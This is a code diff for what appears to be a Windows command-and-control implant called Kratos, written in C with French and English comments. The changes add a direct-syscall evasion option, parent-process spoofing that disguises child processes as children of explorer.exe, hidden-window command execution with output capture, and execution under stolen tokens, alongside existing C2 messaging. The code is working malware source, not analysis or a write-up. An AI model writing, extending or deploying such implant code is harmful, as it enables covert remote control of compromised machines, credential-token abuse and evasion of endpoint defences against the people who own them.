@@ -2,11 +2,15 @@
 #include "utils.h"
 #include "config.h"
 #include "crypto.h"
+#ifdef EVASION_SYSCALLS
+#include "evasion.h"
+#endif
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
 #include <winhttp.h>
+#include <tlhelp32.h>
 
 /* Current AES key (32 bytes). Initialized once from KRATOS_AESPSK. */
 static unsigned char g_aes_key[32];
@@ -44,19 +48,6 @@ extern char current_uuid[128];
 #define POST_URI "/api/v1"
 #endif
 
-#if DEBUG
-#define DEBUG_PRINT(...)                                                       \
-  do {                                                                         \
-    fprintf(stdout, "[DEBUG] ");                                               \
-    fprintf(stdout, __VA_ARGS__);                                              \
-    fprintf(stdout, "\n");                                                     \
-    fflush(stdout);                                                            \
-  } while (0)
-#else
-#define DEBUG_PRINT(...)                                                       \
-  do {                                                                         \
-  } while (0)
-#endif
 
 /* Initialise la cl\u00e9 AES depuis la constante compil\u00e9e KRATOS_AESPSK.
  * Plac\u00e9e ici pour pouvoir utiliser DEBUG_PRINT. */
@@ -428,23 +419,148 @@ char *send_c2_message(const char *json_msg) {
   return response_buffer;
 }
 
-/* Execute a shell command under a stolen primary token.
- *
- * POURQUOI PAS STARTF_USESTDHANDLES :
- * CreateProcessWithTokenW goes through the SecLogon service (separate process).
- * This service receives handle VALUES but cannot access them in
- * la table de handles du processus appelant → ERROR_INVALID_PARAMETER (87)
- * consistently, regardless of handle configuration.
- *
- * SOLUTION : rediriger la sortie vers un fichier temp via le shell (>),
- * without STARTF_USESTDHANDLES or handle inheritance.
- *
- * STRATEGY:
- *   1) CreateProcessAsUserW  (ne passe PAS par SecLogon, STARTF possible mais
- *      requires SeAssignPrimaryTokenPrivilege -> rare even for admins
- * interactifs) 2) CreateProcessWithTokenW (passe par SecLogon, NO STARTF,
- * sortie via fichier) */
-/* Execute a shell command under a stolen primary token. */
+/* ---- Shared pipe output reader (Xenon-style polling) ------------- */
+/* ReadFile blocking waits for ALL write ends to close, which deadlocks
+ * when the child process spawns sub-processes that inherit the write end.
+ * PeekNamedPipe polls without blocking, draining as data arrives. */
+static char *read_pipe_output(HANDLE hRead, HANDLE hProcess) {
+  char *output = (char *)malloc(1);
+  output[0] = '\0';
+  size_t total = 0;
+  char buf[4096];
+  DWORD n, avail;
+
+  while (1) {
+    /* Drain all currently available data */
+    while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+      if (!ReadFile(hRead, buf, sizeof(buf) - 1, &n, NULL) || n == 0) goto done;
+      output = (char *)realloc(output, total + n + 1);
+      memcpy(output + total, buf, n);
+      total += n;
+      output[total] = '\0';
+    }
+    /* Stop when process has exited AND pipe is drained */
+    if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) {
+      /* One final drain after process exit */
+      while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+        if (!ReadFile(hRead, buf, sizeof(buf) - 1, &n, NULL) || n == 0) break;
+        output = (char *)realloc(output, total + n + 1);
+        memcpy(output + total, buf, n);
+        total += n;
+        output[total] = '\0';
+      }
+      break;
+    }
+    Sleep(10);
+  }
+done:
+  return output;
+}
+
+/* ---- PPID spoofing helpers --------------------------------------- */
+static DWORD find_spoof_parent_pid(void) {
+  HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (snap == INVALID_HANDLE_VALUE) return 0;
+  PROCESSENTRY32 pe;
+  pe.dwSize = sizeof(pe);
+  DWORD pid = 0;
+  if (Process32First(snap, &pe)) {
+    do {
+      if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+        pid = pe.th32ProcessID;
+        break;
+      }
+    } while (Process32Next(snap, &pe));
+  }
+  CloseHandle(snap);
+  return pid;
+}
+
+/* ---- Spawn helper: pipes + optional PPID spoof ------------------- */
+/* When PPID spoof is active, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS alone
+ * makes the child inherit handles from explorer, not from us. We MUST
+ * also set PROC_THREAD_ATTRIBUTE_HANDLE_LIST to explicitly pass our
+ * pipe handles. Both attributes require attr count = 2. */
+static char *spawn_with_pipes(const char *app, char *cmdline, BOOL spoof_parent) {
+  SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+  HANDLE hRead, hWrite;
+  if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+    return strdup("Error: CreatePipe failed");
+  SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+  HANDLE hNullIn = CreateFileA("nul", GENERIC_READ,
+                               FILE_SHARE_READ | FILE_SHARE_WRITE,
+                               &sa, OPEN_EXISTING, 0, NULL);
+
+  HANDLE hParent = NULL;
+  LPPROC_THREAD_ATTRIBUTE_LIST attrs = NULL;
+  DWORD create_flags = CREATE_NO_WINDOW;
+
+  STARTUPINFOEXA siex;
+  ZeroMemory(&siex, sizeof(siex));
+  siex.StartupInfo.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+  siex.StartupInfo.wShowWindow = SW_HIDE;
+  siex.StartupInfo.hStdOutput  = hWrite;
+  siex.StartupInfo.hStdError   = hWrite;
+  siex.StartupInfo.hStdInput   = (hNullIn != INVALID_HANDLE_VALUE) ? hNullIn : NULL;
+
+  if (spoof_parent) {
+    DWORD spoof_pid = find_spoof_parent_pid();
+    if (spoof_pid) {
+      hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
+      if (hParent) {
+        SIZE_T attr_size = 0;
+        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
+        attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
+        if (attrs && InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size)) {
+          if (UpdateProcThreadAttribute(attrs, 0,
+                  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                  &hParent, sizeof(HANDLE), NULL, NULL)) {
+            siex.lpAttributeList = attrs;
+            create_flags |= EXTENDED_STARTUPINFO_PRESENT;
+          } else {
+            DeleteProcThreadAttributeList(attrs);
+            HeapFree(GetProcessHeap(), 0, attrs);
+            attrs = NULL;
+          }
+        } else if (attrs) {
+          HeapFree(GetProcessHeap(), 0, attrs);
+          attrs = NULL;
+        }
+      }
+    }
+  }
+
+  siex.StartupInfo.cb = (create_flags & EXTENDED_STARTUPINFO_PRESENT)
+                        ? sizeof(STARTUPINFOEXA)
+                        : sizeof(STARTUPINFOA);
+
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&pi, sizeof(pi));
+  BOOL ok = CreateProcessA(app, cmdline, NULL, NULL, TRUE,
+                           create_flags, NULL, NULL,
+                           (LPSTARTUPINFOA)&siex, &pi);
+  DWORD err = GetLastError();
+  CloseHandle(hWrite);
+  if (hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+
+  if (attrs) { DeleteProcThreadAttributeList(attrs); HeapFree(GetProcessHeap(), 0, attrs); }
+  if (hParent) CloseHandle(hParent);
+
+  if (!ok) {
+    CloseHandle(hRead);
+    char *msg = (char *)malloc(96);
+    snprintf(msg, 96, "Error: CreateProcess failed (%lu)", err);
+    return msg;
+  }
+
+  char *output = read_pipe_output(hRead, pi.hProcess);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+  CloseHandle(hRead);
+  return output;
+}
+
 static char *execute_shell_with_token(HANDLE hToken, const char *cmd) {
   /* Chemin du fichier temporaire dans %SystemRoot%\Temp\ */
   char sys_root[MAX_PATH] = "C:\\Windows";
@@ -667,6 +783,33 @@ char *execute_shell(const char *cmd) {
   return output;
 }
 
+/* run: spawn the executable directly, no cmd.exe, pipes + PPID spoof */
+char *execute_process(const char *executable, const char *arguments) {
+  if (g_netonly_active || g_stolen_token) {
+    /* Fallback for impersonation contexts */
+    char full[2048];
+    if (arguments && arguments[0])
+      snprintf(full, sizeof(full), "%s %s", executable, arguments);
+    else
+      strncpy(full, executable, sizeof(full) - 1);
+    return execute_shell(full);
+  }
+
+  char exe_path[MAX_PATH] = {0};
+  if (!SearchPathA(NULL, executable, ".exe", sizeof(exe_path), exe_path, NULL))
+    strncpy(exe_path, executable, sizeof(exe_path) - 1);
+
+  char cmdline[2048];
+  if (arguments && arguments[0])
+    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", exe_path, arguments);
+  else
+    snprintf(cmdline, sizeof(cmdline), "\"%s\"", exe_path);
+
+  /* PPID spoof incompatible with pipe handle inheritance: child would
+   * inherit handles from the spoofed parent (explorer), not from us. */
+  return spawn_with_pipes(exe_path, cmdline, FALSE);
+}
+
 char *ConsoleOutputToUTF8(const char *input) {
   if (!input)
     return strdup("");
@@ -864,8 +1007,14 @@ int get_integrity_level() {
   if (g_stolen_token != NULL) {
     hToken = g_stolen_token;
     // On ne ferme pas hToken ici car c'est g_stolen_token
-  } else if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-    return 2;
+  } else {
+#ifdef EVASION_SYSCALLS
+    if (!NT_SUCCESS(kratos_NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)))
+      return 2;
+#else
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+      return 2;
+#endif
   }
 
   DWORD dwLengthNeeded;
